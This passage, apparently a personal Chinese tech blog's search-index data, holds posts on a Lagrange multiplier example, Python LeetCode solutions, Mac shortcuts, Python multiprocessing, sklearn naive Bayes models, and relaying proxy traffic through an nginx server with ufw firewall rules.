{\\partial{\\mathcal{L}(x,y,z,\\lambda)}} {\\partial{\\lambda}} = \\dfrac{x^2}{a^2} + \\dfrac{y^2}{b^2} + \\dfrac{z^2}{c^2} - 1 = 0$联立前面三个方程得到$bx = ay$和$az = cx$，带入第四个方程解得：$x = \\dfrac{\\sqrt{3}}{3}a$ $y = \\dfrac{\\sqrt{3}}{3}b$ $z = \\dfrac{\\sqrt{3}}{3}c$带入解得内接长方体的最大体积为：$V_{max} = f(\\dfrac{\\sqrt{3}}{3}a,\\dfrac{\\sqrt{3}}{3}b,\\dfrac{\\sqrt{3}}{3}c) = \\dfrac{8\\sqrt{3}}{9}abc$ 四、其他维基百科上的这幅图画的很直观，特转自于此另外，拉格朗日乘数法只能求极值，不能精确到极小值或极大值（像求导求极值一样），所以要代入试验。","link":"/2019/12/09/langrange-multi-approach/"},{"title":"LeetCode DAY 1 (1-3)","text":"LeetCode系列 争取每日更新3题 —— 一个为了有工作的fw会坚持下去的！（自从昨天尝试着做了几道leetcode才发现我的代码能力几乎等于0…照这样下去我怕是要找不到工作了…因此从现在开始每天督促自己刷3道leetcode…并且第二天将前一天的解题过程上传到这里就当作是巩固复习吧…） 1. 两数之和（简单）题目描述给定一个整数数组 nums 和一个目标值 target，请你在该数组中找出和为目标值的那两个整数，并返回他们的数组下标。你可以假设每种输入只会对应一个答案。但是，你不能重复利用这个数组中同样的元素。 示例1234给定 nums = [2, 7, 11, 15], target = 9因为 nums[0] + nums[1] = 2 + 7 = 9所以返回 [0, 1] 代码刚开始看到这道题的时候觉得很简单，虽然题目本来就标的就是简单…..于是一开始就这样胡乱一写…123456class Solution: def twoSum(self, nums, target): for i in range(0, len(nums)): for j in range(i+1, len(nums)): if nums[i]+nums[j]==target: return [i, j]这样写虽然可以做到题目要求，但是时间复杂度太高了$O(n^{2})$，因此提交的时候有时候可以通过，有时候就是时间超过限制，看了评论区各位大佬的提示，讲到可以利用哈希表查找以空间换取时间的做法降低时间复杂度。于是改写代码如下：123456789101112class Solution: def twoSum(self, nums, target): dict1 = &#123;&#125; if len(nums)&lt;2: return 0 for i in range(0,len(nums)): num = target - nums[i] if num not in dict1: dict1[nums[i]] = i else: return[dict1[num],i] return 0在python里，字典就对应着哈希查找表，于是我们相当于多定义了一个字典，最开始字典为空，按nums数组中的顺序取数，首先计算这个数字需要与什么数字相加才能等于target，然后就去字典里查找有没有这个数字，如果没有，那就将当前读的数字添加到字典中，key为数字的值，value为标号，所以最后总会在字典中查找到答案，这样时间复杂度就降低到了$O(n)$第一题就到这里吧，其实DS里的哈希表我也忘记了，emmmm正好趁现在去复习下吧! 2. 两数相加（中等）题目描述给出两个非空的链表用来表示两个非负的整数。其中，它们各自的位数是按照逆序的方式存储的，并且它们的每个节点只能存储一位数字。如果，我们将这两个数相加起来，则会返回一个新的链表来表示它们的和。您可以假设除了数字0之外，这两个数都不会以0开头。 示例123输入：(2 -&gt; 4 -&gt; 3) + (5 -&gt; 6 -&gt; 4)输出：7 -&gt; 0 -&gt; 8原因：342 + 465 = 807 代码这道题明显是提醒我去复习链表操作了，而且最重要的是我好像从来没有在python中使用过链表…没办法只能硬着头皮瞎jb敲了，最开始还是失败了，原因有两个：1.因为要返回结果所以要留一个头指针 2.next指针要熟练。123456789101112131415161718192021222324# Definition for singly-linked list.# class ListNode:# def __init__(self, x):# self.val = x# self.next = Noneclass Solution: def addTwoNumbers(self, l1, l2): head = ListNode(0) #定义头指针用来返回结果 l3 = head #l3用来进行链表操作 count = 0 #判断是否有进位 while(l1 or l2): x = l1.val if l1 else 0 y = l2.val if l2 else 0 l3.next = ListNode((x+y+count)%10) #从个位数开始计算 l3 = l3.next #指针移动 count = (x+y+count)//10 #注意python中的整除有两个// if(l1!=None): l1 = l1.next if(l2!=None): l2 = l2.next if(count == 1): #如果最后还有有进位 l3.next = ListNode(1) return head.next虽然这道题的难度标的是中等，但感觉只要链表操作熟练了，这道题还是蛮简单的。算了算了别忘了复习链表操作…一定不要忘了返回结果需要头指针哦… 3. 无重复字符的最长子串（中等）题目描述给定一个字符串，请你找出其中不含有重复字符的最长子串的长度。 示例1123输入: \"abcabcbb\"输出: 3 解释: 因为无重复字符的最长子串是 \"abc\"，所以其长度为 3。 示例2123输入: \"bbbbb\"输出: 1解释: 因为无重复字符的最长子串是 \"b\"，所以其长度为 1。 示例31234输入: \"pwwkew\"输出: 3解释: 因为无重复字符的最长子串是 \"wke\"，所以其长度为 3。 请注意，你的答案必须是 子串 的长度，\"pwke\" 是一个子序列，不是子串。 代码刚看完题目描述的我觉得这道题目好像很简单啊，用第一题时候一样的字典查找就可以解决了，最后题目给的三个例子倒是通过了，提交检测的几百上千个测试用例却总有通不过的，为了涵盖不同的测试用例代码被我改的又臭又长，折腾了一段时间只好打开了百度放弃了挣扎…所以说到底我的代码能力是真滴弱啊…因此直接附上大佬们的代码吧…1234567891011class Solution: def lengthOfLongestSubstring(self, s): dict1 = &#123;&#125; #定义一个字典用来查找 i , ans = 0, 0 #i代表重复的最后的位置，ans为结果 for j in range(len(s)): if s[j] in dict1: i = max(dict1[s[j]],i) #取重复的最后面的字符位置 #i = dict1[s[j]] ans = max(ans, j-i+1) #取最大的子序列长度 dict1[s[j]] = j+1 #将不在字典中的也就是不重复的字母放入字典,同时保持位置更新，使用j+1是为了直接跳到重复字符的下一个位置。 return ans最后反思一下自己为什么想不到为什么想不到……","link":"/2019/11/13/leetcode-day1/"},{"title":"LeetCode DAY 4 (6)","text":"嘿！大家好，懒狗又要开始更新Leetcode咯！ 6. Z字形变换（中等）题目描述将一个给定字符串根据给定的行数，以从上往下、从左到右进行 Z 字形排列。比如输入字符串为&quot;LEETCODEISHIRING&quot;行数为3时，排列如下：123L C I RE T O E S I I GE D H N之后，你的输出需要从左往右逐行读取，产生出一个新的字符串，比如：&quot;LCIRETOESIIGEDHN&quot;。请你实现这个将字符串进行指定行数变换的函数：string convert(string s, int numRows); 示例1:12输入: s = \"LEETCODEISHIRING\", numRows = 3输出: \"LCIRETOESIIGEDHN\" 示例2:12345678输入: s = \"LEETCODEISHIRING\", numRows = 4输出: \"LDREOEIIECIHNTSG\"解释:L D RE O E I IE C I H NT S G 代码解法1：按行取值（就叫找规律吧…）我们可以从这个Z字形（大哥这明明就是N字形啊）的排列上找出些规律，比如如果numRows = 3，那么第一行的两个元素相差的距离为4，也就是d = 2*numRows-2，最后一行亦如此，而从示例2我们可以看出，中间各行的元素间隔虽然不相等，但是只有两种分布，一种比第一行的d要少一部分，而这一部分就是2*距离第一行的行数差，那另一种元素间隔就是d-刚刚那种元素间隔，就这么简单？还真就这么被找规律找出来了hhh，我都想笑了。123456789101112131415161718192021222324252627282930class Solution(object): def convert(self, s, numRows): \"\"\" :type s: str :type numRows: int :rtype: str \"\"\" if numRows == 1 or numRows &gt;= len(s): return s else: ans = [] i = 0 n = 2*numRows-2 # 第一行 while i &lt; len(s): ans.append(s[i]) i += n # 中间各行 for i in range(2,numRows): n = n - 2 while i-1 &lt; len(s): ans.append(s[i-1]) i += n # 最后一行 n = 2*numRows-2 i = numRows-1 while i &lt; len(s): ans.append(s[i]) i += n return ''.join(ans)但是看完评论区另一种解法我气的够呛，卧槽我怎么能这么傻，害，这么明显的规律我都没发现… 解法3：按列取值（我觉得更像顺藤摸瓜，嘻嘻嘻）上一种方法是从s中按最终答案的顺序取值，那我们能不能换个思考方式，按照s的存储顺序取值呢。1234567891011121314151617class Solution(object): def convert(self, s, numRows): \"\"\" :type s: str :type numRows: int :rtype: str \"\"\" if numRows &gt;= len(s) or numRows == 1: return s ans, count, d = ['']*numRows, 0, 1 for i in s: ans[count] += i count += d # 当到第一行和最后一行的时候d需要反转 if count==0 or count==numRows-1: d = -d return ''.join(ans)","link":"/2020/01/13/leetcode-day4/"},{"title":"LeetCode DAY 5 (7-8)","text":"虽然打了一下午的游戏，但懒狗不会忘记刷题的！ 7. 整数反转（简单）题目描述给出一个32位的有符号整数，你需要将这个整数中每位上的数字进行反转。 示例1:12输入: 123输出: 321 示例2:12输入: -123输出: -321 示例3:12输入: 120输出: 21 代码解法1：弹出和推入数字 &amp; 溢出前进行检查取出一位数字很显然用到%，之后需要用//将取出的一位数字从原数值中删去。123456789101112131415class Solution(object): def reverse(self, x): \"\"\" :type x: int :rtype: int \"\"\" y, ans = abs(x), 0 # 边界 boundry = (1&lt;&lt;31) if x&lt;0 else (1&lt;&lt;31) - 1 while y!=0: ans = ans*10 + y%10 if ans &gt; boundry: return 0 y //= 10 return ans if x&gt;0 else -ans另外利用移位可以很容易表示一个很大的边界值。 解法2: 转化为字符串12345678910111213141516171819class Solution(object): def reverse(self, x): \"\"\" :type x: int :rtype: int \"\"\" if -10&lt;x&lt;10: return x str_x = str(x) boundry = 1&lt;&lt;31 if x&lt;0 else (1&lt;&lt;31)-1 if x&gt;0: temp = str_x[::-1] else: temp = str_x[:0:-1] ans = int(temp) if ans&gt;boundry: return 0 else: return ans if x&gt;0 else -ans在这里再次提醒自己熟悉一下python字符串的切片功能。 8. 字符串转换整数(atoi)（中等）题目描述请你来实现一个 atoi 函数，使其能将字符串转换成整数。首先，该函数会根据需要丢弃无用的开头空格字符，直到寻找到第一个非空格的字符为止。当我们寻找到的第一个非空字符为正或者负号时，则将该符号与之后面尽可能多的连续数字组合起来，作为该整数的正负号；假如第一个非空字符是数字，则直接将其与之后连续的数字字符组合起来，形成整数。该字符串除了有效的整数部分之后也可能会存在多余的字符，这些字符可以被忽略，它们对于函数不应该造成影响。注意：假如该字符串中的第一个非空格字符不是一个有效整数字符、字符串为空或字符串仅包含空白字符时，则你的函数不需要进行转换。在任何情况下，若函数不能进行有效的转换时，请返回0。 示例1:12输入: &quot;42&quot;输出: 42 示例2:1234输入: &quot; -42&quot;输出: -42解释: 第一个非空白字符为 &apos;-&apos;, 它是一个负号。 我们尽可能将负号与后面所有连续出现的数字组合起来，最后得到 -42 。 示例3:123输入: &quot;4193 with words&quot;输出: 4193解释: 转换截止于数字 &apos;3&apos; ，因为它的下一个字符不为数字。 示例4:1234输入: &quot;words and 987&quot;输出: 0解释: 第一个非空字符是 &apos;w&apos;, 但它不是数字或正、负号。 因此无法执行有效的转换。 示例5:1234输入: &quot;-91283472332&quot;输出: -2147483648解释: 数字 &quot;-91283472332&quot; 超过 32 位有符号整数范围。 因此返回 INT_MIN (−231) 。 代码这道题可以利用正则表达式，一行代码就可以解决。1234567class Solution(object): def myAtoi(self, str): \"\"\" :type str: str :rtype: int \"\"\" return max(min(int(*re.findall(r'^[\\+\\-]?\\d+', str.lstrip())), (1&lt;&lt;31)-1), -(1&lt;&lt;31))这里需要注意的是，因为re.findall()返回的是个列表，因此调用int()方法转化为整数的时候需要前面加一个*。这道题也提醒我该去好好看看正则表达式了…","link":"/2020/01/14/leetcode-day5/"},{"title":"LeetCode DAY 6 (9-10)","text":"日常更新冒泡… 9. 回文数（简单）题目描述判断一个整数是否是回文数。回文数是指正序（从左向右）和倒序（从右向左）读都是一样的整数。 示例1:12输入: 121输出: true 示例2:123输入: -121输出: false解释: 从左向右读, 为 -121 。 从右向左读, 为 121- 。因此它不是一个回文数。 示例3:123输入: 10输出: false解释: 从右向左读, 为 01 。因此它不是一个回文数。 代码解法1：转为字符串处理利用python的切片功能一行代码即可解决。1234567class Solution(object): def isPalindrome(self, x): \"\"\" :type x: int :rtype: bool \"\"\" return str(x) == str(x)[::-1] 解法2：不利用字符串翻转整个数值，官方题解有说反转一半，以防溢出，但是溢出不就不是回文数了，因此我觉得不需要考虑溢出。1234567891011121314151617class Solution(object): def isPalindrome(self, x): \"\"\" :type x: int :rtype: bool \"\"\" if x &lt; 0: return False ans = 0 pri = x while x != 0: ans = x%10 + ans*10 x //= 10 if ans == pri: return True else: return False 10. 正则表达式匹配（困难）题目描述给你一个字符串s和一个字符规律p，请你来实现一个支持&#39;.&#39;和&#39;*&#39;的正则表达式匹配。12&apos;.&apos; 匹配任意单个字符&apos;*&apos; 匹配零个或多个前面的那一个元素所谓匹配，是要涵盖整个字符串s的，而不是部分字符串。 s可能为空，且只包含从a-z的小写字母。 p可能为空，且只包含从a-z的小写字母，以及字符.和*。 示例1:12345输入:s = &quot;aa&quot;p = &quot;a&quot;输出: false解释: &quot;a&quot; 无法匹配 &quot;aa&quot; 整个字符串。 示例2:12345输入:s = &quot;aa&quot;p = &quot;a*&quot;输出: true解释: 因为 &apos;*&apos; 代表可以匹配零个或多个前面的那一个元素, 在这里前面的元素就是 &apos;a&apos;。因此，字符串 &quot;aa&quot; 可被视为 &apos;a&apos; 重复了一次。 示例3:12345输入:s = &quot;ab&quot;p = &quot;.*&quot;输出: true解释: &quot;.*&quot; 表示可匹配零个或多个（&apos;*&apos;）任意字符（&apos;.&apos;）。 示例4:12345输入:s = &quot;aab&quot;p = &quot;c*a*b&quot;输出: true解释: 因为 &apos;*&apos; 表示零个或多个，这里 &apos;c&apos; 为 0 个, &apos;a&apos; 被重复一次。因此可以匹配字符串 &quot;aab&quot;。 示例5:1234输入:s = &quot;mississippi&quot;p = &quot;mis*is*p*.&quot;输出: false 代码解法1：暴力递归12345678910111213141516class Solution(object): def isMatch(self, s, p): \"\"\" :type s: str :type p: str :rtype: bool \"\"\" if len(p) == 0: return not s # 出现'.'的情况 first = bool(s) and p[0] in (s[0], '.') # 出现'*'的情况 if len(p)&gt;1 and p[1]=='*': return self.isMatch(s, p[2:]) or (first and self.isMatch(s[1:], p)) else: return first and self.isMatch(s[1:], p[1:]) 当出现&#39;.&#39;的时候，因为它匹配任意字符，因此只要额外判断p[i]是否等于&#39;.&#39;即可； 对于出现&#39;*&#39;时，因为它匹配0个到任意个星号前面的字符，所以我们需要对它进行不同的处理，虽然他能匹配0～n个字符，但是对于递归而言，只有两种情况：0个和1个。 解法2: 递归优化123456789101112131415161718192021class Solution(object): def isMatch(self, s, p): \"\"\" :type s: str :type p: str :rtype: bool \"\"\" # 定义一个字典作为备忘录 memo = dict() def dp(i, j): # 避免重复计算 if (i,j) in memo: return memo[(i,j)] if j==len(p): return i==len(s) first = i&lt;len(s) and p[j] in (s[i], '.') if j&lt;len(p)-1 and p[j+1] == '*': ans = dp(i,j+2) or first and dp(i+1,j) else: ans = first and dp(i+1,j+1) memo[(i,j)] = ans return ans return dp(0,0)使用两个变量i,j记录当前匹配到的位置，从而避免使用子字符串切片，并且将i,j存入备忘录，避免重复计算。","link":"/2020/01/15/leetcode-day6/"},{"title":"LeetCode DAY 7 (11-12)","text":"我果然还是一条懒狗，拖更了两天，今天补上。 11. 盛最多水的容器（中等）题目描述给定n个非负整数a1，a2，…，an，每个数代表坐标中的一个点(i, ai)。在坐标内画n条垂直线，垂直线i的两个端点分别为(i, ai)和(i, 0)。找出其中的两条线，使得它们与x轴共同构成的容器可以容纳最多的水。说明：你不能倾斜容器，且n的值至少为2。图中垂直线代表输入数组[1,8,6,2,5,4,8,3,7]。在此情况下，容器能够容纳水（表示为蓝色部分）的最大值为49。 示例：12输入: [1,8,6,2,5,4,8,3,7]输出: 49 代码解法1：暴力穷举法本懒狗第一个想到的办法就是写两个for循环穷举所有情况…12345678910111213class Solution(object): def maxArea(self, height): \"\"\" :type height: List[int] :rtype: int \"\"\" maxarea = 0 for i in range(0, len(height)-1): for j in range(i+1, len(height)): area = (j-i)*min(height[i], height[j]) if maxarea &lt; area: maxarea = area return maxarea 解法2：（双指针法）利用题意中的特点我们知道，盛水的多少取决于容器最短的那根木板，还有两块木板之间的距离。我们将初始位置放在列表的开始和末尾，为了增大两块木板之间的面积，我们不得不将较短的木板向内侧移动以寻求更长的木板，这样虽然会导致木板之间的距离变短，但还是有可能找到比初始位置面积要大的情况存在。12345678910111213141516171819202122class Solution(object): def maxArea(self, height): \"\"\" :type height: List[int] :rtype: int \"\"\" left, right = 0, len(height)-1 # 记录面积 maxarea = 0 while left &lt; right: # 两块木板之间的距离 b = right - left if height[left] &lt; height[right]: h = height[left] left += 1 else: h = height[right] right -= 1 area = b*h if maxarea &lt; area: maxarea = area return maxarea 12. 整数转罗马数字（中等）题目描述罗马数字包含以下七种字符： I， V， X， L，C，D和M。12345678字符 数值I 1V 5X 10L 50C 100D 500M 1000例如，罗马数字2写做II，即为两个并列的I。12写做XII，即为X+II。27写做XXVII,即为XX+V+II。通常情况下，罗马数字中小的数字在大的数字的右边。但也存在特例，例如4不写做IIII，而是IV。数字1在数字5的左边，所表示的数等于大数5减小数1得到的数值4 。同样地，数字9表示为IX。这个特殊的规则只适用于以下六种情况： I可以放在V(5)和X(10)的左边，来表示4和9。 X可以放在L(50)和C(100)的左边，来表示40和90。 C可以放在D(500)和M(1000)的左边，来表示400和900。 给定一个整数，将其转为罗马数字。输入确保在 1 到 3999 的范围内。 示例1:12输入: 3输出: &quot;III&quot; 示例2:12输入: 4输出: &quot;IV&quot; 示例3:12输入: 9输出: &quot;IX&quot; 示例4:123输入: 58输出: &quot;LVIII&quot;解释: L = 50, V = 5, III = 3. 示例5:123输入: 1994输出: &quot;MCMXCIV&quot;解释: M = 1000, CM = 900, XC = 90, IV = 4. 代码解法1：分情况讨论这是我最开始的想法：既然这道题有这么多种情况，那我就直接分情况讨论吧。总共大致分成了三种情况，一种是题目中给出的，也就是单个字符的数值，和特例（数字小的数字在大的数字的左边的情况）；第二种是数字大于5(50,500等)的，最后一种当然就是数字小于5(50,500等)的。将属于第一种情况的键值对写入字典中。123456789101112131415161718192021222324252627class Solution(object): def intToRoman(self, num): \"\"\" :type num: int :rtype: str \"\"\" dict_str = &#123;1:'I', 5:'V', 10:'X', 50:'L', 100:'C', 500:'D', 1000:'M', 4: 'IV', 9:'IX', 40:'XL', 90:'XC', 400:'CD', 900:'CM'&#125; # 用来存储转换成的罗马数字符号的列表，是倒着存储的，因此最后需要重排序 ans_list = [] # 用来存储数字位的倍数 count = 1 while num != 0: a = num % 10 num_str = a * count # 在字典中，取出value即是该位的罗马数字值 if num_str in dict_str: ans_list.append(dict_str[num_str]) # 大于5，需要变成'5的倍数的罗马值'+'某个1倍数的罗马值'*b elif a&gt;5: b = a-5 ans_list.append(dict_str[5*count]+dict_str[count]*b) # 小于5，即 '某个1倍数的罗马值'*a elif a&lt;5: ans_list.append(dict_str[count]*a) count *= 10 num //= 10 return ''.join(ans_list[::-1]) 解法2：贪心算法我们每次用最大面值的来替换，可以保证用的罗马字符最少且最终的组合唯一。其实我们仔细看这些面值，除了特殊的4,9,40,90之类的数，其余都是要么小于5，然后就是几个I连在一起，要么就是大与5，在几个I的左边再加上5(50,500等)对应的罗马数字。只要除去特例，我们每次判断，取面值最大的，然后把该符号加在后面即可，对于特例，直接在字典或列表中加入即可。 1234567891011121314class Solution(object): def intToRoman(self, num): \"\"\" :type num: int :rtype: str \"\"\" nums = [1000, 900, 500, 400, 100, 90, 50, 40, 10, 9, 5, 4, 1] romans = [\"M\", \"CM\", \"D\", \"CD\", \"C\", \"XC\", \"L\", \"XL\", \"X\", \"IX\", \"V\", \"IV\", \"I\"] ans = '' for index in range(0,13): while num &gt;= nums[index]: ans += romans[index] num -= nums[index] return ans","link":"/2020/01/19/leetcode-day7/"},{"title":"Mac使用小技巧","text":"此贴长期更新 1. 隐藏桌面所有文件/文件夹隐藏：1defaults write com.apple.finder CreateDesktop -bool false;killall Finder恢复显示：1defaults write com.apple.finder CreateDesktop -bool true;killall Finder 2. 微调音量/亮度option + shift + 音量/亮度 3. 切换应用程序command + Tab 从左-&gt;右command + shift + Tab 反向 4. 常用快捷键（持续更新） 浏览器中将网页加入个人收藏：command + D 浏览器新建标签页：command + T 快速调用emoji表情：control + command + space","link":"/2020/03/12/mac-tips/"},{"title":"Python 多进程","text":"学习廖雪峰的Python教程中的多进程部分，知识点整理 一、 Unix、Linux在unix/linux系统下，可以直接使用fork()创建子进程。fork()函数调用一次，返回两次，因为操作系统自动把当前进程（父进程）复制了一份（子进程），然后分别在父进程和子进程内返回，创建成功子进程内返回pid=0，父进程内返回值为子进程的pid。 使用fork()需要import os 示例代码： 123456789import osprint('Process (%s) start...' % os.getpid())# Only works on Unix/Linux/Mac:pid = os.fork()if pid == 0: print('I am child process (%s) and my parent is %s.' % (os.getpid(), os.getppid()))else: print('I (%s) just created a child process (%s).' % (os.getpid(), pid)) 执行结果： 123Process (63034) start...I (63034) just created a child process (63035).I am child process (63035) and my parent is 63034. 二、跨平台使用由于python是跨平台的，自然也提供一个跨平台的多进程支持，multiprocessing模块就是跨平台版本的多进程模块。 Process 使用Process()创建子进程实例，之后使用实例的start()方法开始启动子进程 示例代码： 1234567891011121314151617from multiprocessing import Processimport os#子进程要执行的代码def run_proc(name): print('Run child process %s (%s).' % (name,os.getpid()))if __name__ == '__main__': print('Parent process %s.' % os.getpid()) #创建子进程 p = Process(target=run_proc, args=('test',)) print('Child process will start') #开始启动子进程 p.start() #join()方法可以等待子进程结束后再继续往下运行，通常用于进程间的同步 p.join() print('Child process end.') 执行结果： 1234Parent process 62629.Child process will startRun child process test (62630).Child process end. Pool 如果要启用大量子进程，可以使用进程池Pool 示例代码： 1234567891011121314151617181920212223from multiprocessing import Poolimport os,time,randomdef long_time_task(name): print('Run task %s (%s)...' % (name,os.getpid())) start = time.time() #random()随机产生0～1之间的数 time.sleep(random.random()*3) end = time.time() print('Task %s runs %.2f seconds.' % (name,(end-start)))if __name__ == '__main__': print('Parent process %s.' % os.getpid()) #限制同时运行4个子进程 p = Pool(4) for i in range(5): p.apply_async(long_time_task,args=(i,)) print('Waiting for all subprocesses done') #调用join()之前必须先调用close(),之后不能继续添加新的Process了 p.close() #等待所有子进程执行完毕 p.join() print('All subprocesses done.') 执行结果： 12345678910111213Parent process 63187.Waiting for all subprocesses doneRun task 1 (63189)...Run task 2 (63190)...Run task 3 (63191)...Run task 0 (63188)...Task 3 runs 0.15 seconds.Run task 4 (63191)...Task 2 runs 0.96 seconds.Task 1 runs 1.18 seconds.Task 0 runs 1.72 seconds.Task 4 runs 2.17 seconds.All subprocesses done. 可以通过执行结果看到，定义Pool(4)之后只能同时执行4个进程。","link":"/2019/08/27/multiprocessing/"},{"title":"朴素贝叶斯的三个常用模型","text":"高斯、多项式、伯努利 朴素贝叶斯（naive_bayes）若一个样本有n个特征，分别用$x_{1},x_{2},…,x_{n}$表示，将其划分到类yk的可能性$P(y_{k}|x_{1},x_{2},…,x_{n})$为：$P(y_{k}|x_{1},x_{2},…,x_{n}) = P(y_{k})\\prod_{i=1}^{n}P(x_{i}|y_{k})$ 上式中等号右侧的各个值可以通过训练得到。根据上面的公式可以求的某个数据属于各个分类的可能性（这些可能性之和不一定是1），该数据应该属于具有最大可能性的分类中。一般来说，如果一个样本没有特征xi，那么P(xi|yk)将不参与计算。不过下面的伯努利模型除外。 以上是朴素贝叶斯的最基本的内容。 高斯模型（GaussianNB）有些特征可能是连续型变量，比如说人的身高，物体的长度，这些特征可以转换成离散型的值，比如如果身高在160cm以下，特征值为1；在160cm和170cm之间，特征值为2；在170cm之上，特征值为3。也可以这样转换，将身高转换为3个特征，分别是f1、f2、f3，如果身高是160cm以下，这三个特征的值分别是1、0、0，若身高在170cm之上，这三个特征的值分别是0、0、1。不过这些方式都不够细腻，高斯模型可以解决这个问题。高斯模型假设这些一个特征的所有属于某个类别的观测值符合高斯分布，也就是$P(x_{i}|y_{k}) = \\frac{1}{\\sqrt{2\\pi\\sigma_{y_{k}}^{2}}}exp( -\\frac{(x_{i}-\\mu_{y_{k}})^2} {2\\sigma_{y_{k}}^{2}} )$ sklearn实例：1234567891011121314from sklearn import datasetsfrom sklearn.naive_bayes import GaussianNBiris = datasets.load_iris()#四个特征的名字print(iris.feature_names) clf = GaussianNB()clf.fit(iris.data,iris.target)#第0个数据的标签及其预测print(iris.target[0])print(clf.predict(iris.data[0].reshape(1,-1)))#第149个数据的标签及其预测print(iris.target[149])print(clf.predict(iris.data[149].reshape(1,-1)))运行结果：123456['sepal length (cm)', 'sepal width (cm)', 'petal length (cm)', 'petal width (cm)']0[0]2[2][Finished in 0.9s] 多项式模型（MultinomialNB）该模型常用于文本分类，特征是单词，值是单词的出现次数。$P(x_{i}|y_{k}) = \\frac{N_{y_{k}x_{i}}+\\alpha}{N_{y_{k}}+\\alpha n}$其中，$N_{y_{k}x_{i}}$是类别$y_{k}$下特征$x_{i}$出现的次数；$N_{y_{k}}$是类别$y_{k}$下所有特征出现的总次数。对应到文本分类里，如果单词word在一篇分类为label1的文档中出现了5次，那么$N_{label1,word}$的值会增加5。如果是去除了重复单词的，那么$N_{label1,word}$的值会增加1。$n$是特征的数量，在文本分类中就是去重后的所有单词的数量。$α$的取值范围是[0,1]，比较常见的是取值为1。 待预测样本中的特征xi在训练时可能没有出现，如果没有出现，则$N_{ykxi}$值为0，如果直接拿来计算该样本属于某个分类的概率，结果都将是0。在分子中加入$α$，在分母中加入$αn$可以解决这个问题。 sklearn实例：12345678import numpy as npfrom sklearn.naive_bayes import MultinomialNB#随机生成6*100个小于5大于等于0的数X = np.random.randint(5, size=(6,100))Y = np.array([1, 2, 3, 4, 5, 6])clf = MultinomialNB()clf.fit(X, Y)print(clf.predict(X[2].reshape(1,-1)))运行结果：12[3][Finished in 0.5s] Tips: 多项式模型在训练一个数据集结束后可以继续训练其他数据集而无需将两个数据集放在一起进行训练。在sklearn中，MultinomialNB()类的partial_fit()方法可以进行这种训练。这种方式特别适合于训练集大到内存无法一次性放入的情况。 在第一次调用partial_fit()时需要给出所有的分类标号。12345678import numpy as npfrom sklearn.naive_bayes import MultinomialNBclf = MultinomialNB()#在第一次调用时需要给出所有的分类标号clf.partial_fit(np.array([1,1]).reshape(1,-1), np.array(['aa']), ['aa','bb'])clf.partial_fit(np.array([6,1]).reshape(1,-1), np.array(['bb']))print(clf.predict(np.array([9,1]).reshape(1,-1)))运行结果：12['bb'][Finished in 0.5s] 伯努利模型在伯努利模型中，对于一个样本来说，其特征用的是全局的特征。每个特征的取值是布尔型的，也就是true和false，或者1和0。在文本分类中，就是一个特征有没有在一个文档中出现。 如果特征值$x_{i}$为1，那么$P(x_{i}|y_{k}) = P(x_{i}=1|y_{k})$如果特征值$x_{i}$为0，那么$P(x_{i}|y_{k}) = 1-P(x_{i}=1|y_{k})$ 这意味着，“没有某个特征”也是一个特征。 sklearn实例：1234567import numpy as npfrom sklearn.naive_bayes import BernoulliNBX = np.random.randint(2, size=(6, 100))Y = np.array([1, 2, 3, 4, 4, 5])clf = BernoulliNB()clf.fit(X, Y)print(clf.predict(X[2].reshape(1, -1)))运行结果：12[3][Finished in 1.0s]","link":"/2019/10/14/navie-bayes/"},{"title":"通过国内服务器转发流量科学上网","text":"从除夕那天开始，我的代理服务器就被GFW墙掉了，前些天重新搭了一个，先是被封端口，过了几天ip又被墙掉了，为了解决这个问题，因此有了这篇文章。具体方法借鉴于该篇文章：Click Here如果您不愿多点击一次链接，就请继续往下看，本文对于上述博文稍作整理。完成此博文所介绍的方法的基本条件： 一台国内服务器，如阿里云腾讯云等，我这里以阿里云为例，系统为Ubuntu 16.04。 一台用于代理的服务器，我这里以Digitalocean为例，系统为Ubuntu 18.04. 一、简介通过国内服务器转发流量看起来是多此一举，从“国内-&gt;境外VPS“变成了”国内-&gt;国内服务器-&gt;境外VPS“，但国内大厂的服务器出入境走的都是高级路线，国内服务器与我们的延迟大概在50ms以内，这样算起来延迟是降低了。从上图我们可以明显看到右边加上ping阿里云的延迟明显要比直接ping境外vps的延迟要小很多。该方法属于硬件加速，代价是要多出额外的成本租一台国内服务器，优点是更稳定，可以有效防止境外IP或者端口被封。而国内服务器在这里充当的作用就是流量转发。该方法共分为三个步骤： 国内服务器配置流量转发程序 境外VPS配置代理程序 自己的机器配置代理至国内服务器 还可以在境外的VPS上配置一些web页面，只对外开放80/443端口，其他端口对你的国内服务器的IP地址开放，这样当GFW扫描的时候也只是觉得这是一个网站而已。 二、国内服务器配置流量转发程序这里用到nginx来配置流量转发 安装nginx1sudo apt install nginx 配置文件修改1vi /etc/nginx/nginx.conf添加123456stream &#123; server &#123; listen Port; # 国内服务器的监听端口 proxy_pass 境外VPS的IP:Port;&#125;&#125;保存之后配置开机自启以及启动nginx1systemctl enable nginx &amp;&amp; systemctl start nginx如果你的服务器是阿里云或者腾讯云诸如此类，还需要配置安全组规则，开放TCP连接的listen中配置的端口。如果你之前配置过了代理服务器，那现在将自己机器上的代理软件的IP地址和端口号改为国内这台服务器的地址和端口，应该就能实现科学上网了。如果不行，请检查一下国内服务器有没有配置防火墙规则等。 三、配置境外VPS如果之前你的境外VPS没有配置过代理程序，配置代理的方法具体请参考我的另一篇文章：Click Here对境外VPS配置一番，主要是为了降低GFW的干扰，减少IP地址被墙的几率。除了ssh的22端口，网站的80/443端口，其他端口只允许国内那台服务器的连接。 防火墙配置这里使用的是ubuntu的防火墙ufw。ufw命令举例：123456# 允许某个端口连接ufw allow port# 允许此IP访问所有的本机端口ufw allow from IPv4# 开启防火墙ufw enable经过上述配置后，GFW探测你的VPS，除了ssh和网站的常用端口外，ss/ssr的端口根本无法连接，IP地址的被墙的几率自然就降低了。 将境外VPS伪装的更像一个网站为了把境外VPS做的更像一个网站，因此我们在这台服务器上再放一些web页面。同样的安装nginx1apt install nginxnginx安装完成的时候会自动启动，打开浏览器输入你服务器的IP地址，你会看到如下的界面。nginx的默认目录在/var/www/html/我们将静态页面放到这里面就可以了，一定要有个index.html哦。因为我的博客repo在我的github上，因此我就直接git clone到上面这个目录下了。12345cd /var/www/html/git clone https://github.com/aestheticisma/aestheticisma.github.io# 之后将aestheticisma.github.io里面的东西全部移动到/var/www/html/下cd aestheticisma.github.io/cp -r ./* ..再次在浏览器输入服务器ip地址就会发现有东西显示了。这样我们的境外VPS伪装完成了。 